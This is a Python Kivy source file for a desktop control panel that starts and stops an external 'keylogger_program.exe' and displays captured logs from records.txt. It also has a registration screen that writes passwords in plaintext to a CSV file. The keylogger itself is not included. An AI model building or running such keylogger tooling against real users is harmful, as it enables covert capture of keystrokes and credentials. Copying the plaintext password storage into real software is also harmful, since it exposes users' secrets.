from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.textinput import TextInput
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.screenmanager import ScreenManager, Screen, FadeTransition
from kivy.uix.boxlayout import BoxLayout
import os
import threading


class ScreenManagement(ScreenManager):
    def __init__(self, **kwargs):
        super(ScreenManagement, self).__init__(**kwargs)


class RegisterWindow(Screen):
    def __init__(self, **kwargs):
        super(RegisterWindow, self).__init__(**kwargs)
        self.add_widget(Label(text='Username', size_hint=(.45, .1), pos_hint={'x': .05, 'y': .7}))
        self.username = TextInput(multiline=False, size_hint=(.45, .1), pos_hint={'x': .5, 'y': .7})
        self.add_widget(self.username)
        self.add_widget(Label(text='Password', size_hint=(.45, .1), pos_hint={'x': .05, 'y': .5}))
        self.password = TextInput(multiline=False, password=True, size_hint=(.45, .1), pos_hint={'x': .5, 'y': .5})
        self.add_widget(self.password)
        self.add_widget(Label(text='E-mail', size_hint=(.45, .1), pos_hint={'x': .05, 'y': .3}))
        self.email = TextInput(multiline=False, size_hint=(.45, .1), pos_hint={'x': .5, 'y': .3})
        self.add_widget(self.email)
        self.btn = Button(text='Register', size_hint=(.9, .2), pos_hint={'center_x': .5, 'y': .03})
        self.add_widget(self.btn)
        self.btn.bind(on_press=self.submit)

    def submit(self, instance):
        username = self.username.text
        password = self.password.text
        email = self.email.text

        info = {'Username': username,
                'Password': password,
                'Email': email}

        file = open('data.csv', 'a+')
        file.write(f'{info["Username"]},{info["Password"]},{info["Email"]}\n')
        file.close()

        self.username.text = ''
        self.password.text = ''
        self.email.text = ''

        print(info)


class ChoiceWindow(Screen):
        def __init__(self, **kwargs):
            super(ChoiceWindow, self).__init__(**kwargs)

            with open('status.txt', 'r+') as f:
                self.status = f.readline()
                self.status = self.status.strip()

            if self.status != 'RUNNING':
                currentStatOptionText = 'Start Running Keylogger'
            else:
                currentStatOptionText = 'Stop Running Keylogger'
            
            self.btn2 = Button(text=currentStatOptionText)
            #self.add_widget(self.btn2)
            self.btn3 = Button(text='View Logs')
            #self.add_widget(self.btn3)
            #self.add_widget(self.btn4)
            self.btn2.bind(on_press = self.set_keylogger_status)
            self.btn3.bind(on_press = self.screen_transition_logs)
            
            self.box_layout = BoxLayout()
            self.box_layout.add_widget(self.btn2)
            self.box_layout.add_widget(self.btn3)

            self.add_widget(self.box_layout)


        def set_keylogger_status(self, *args):
            with open('status.txt', 'r+') as f:
                self.status = f.readline()
                self.status = self.status.strip()
            
            if self.status != 'RUNNING':
                #os.system('python3 keylogger_program.py')

                os.startfile('keylogger_program.exe')
                self.btn2.text = 'Stop Running Keylogger'
                with open(r'status.txt', 'w+') as f:
                    f.write('RUNNING')
            else:

                with open(r'status.txt', 'w+') as f:
                    f.write('STOPPED')
                self.btn2.text = 'Start Running Keylogger'

        def screen_transition_logs(self, *args):
            self.manager.current = 'logs'



class LogWindow(Screen):
    def __init__(self, **kwargs):
            super(LogWindow, self).__init__(**kwargs)

            with open('records.txt', 'r+') as f:
                theText = f.read()
            
            self.logs_text = TextInput(text=theText, font_size='20sp', multiline=True)
            self.btn2 = Button(text='Back', pos=(0,0), size_hint=(.1,.1))


            self.btn2.bind(on_press = self.screen_transition_choice)
                        
            self.box_layout = BoxLayout()
            self.box_layout.add_widget(self.btn2)
            self.box_layout.add_widget(self.logs_text)

            self.add_widget(self.box_layout)
            
            #self.add_widget(self.logs_text)

    def screen_transition_choice(self, *args):
            self.manager.current = 'choice'

class Application(App):
    def build(self):
        sm = ScreenManagement(transition=FadeTransition())
        sm.add_widget(ChoiceWindow(name='choice'))
        sm.add_widget(LogWindow(name='logs'))
        return sm


if __name__ == "__main__":
    Application().run()
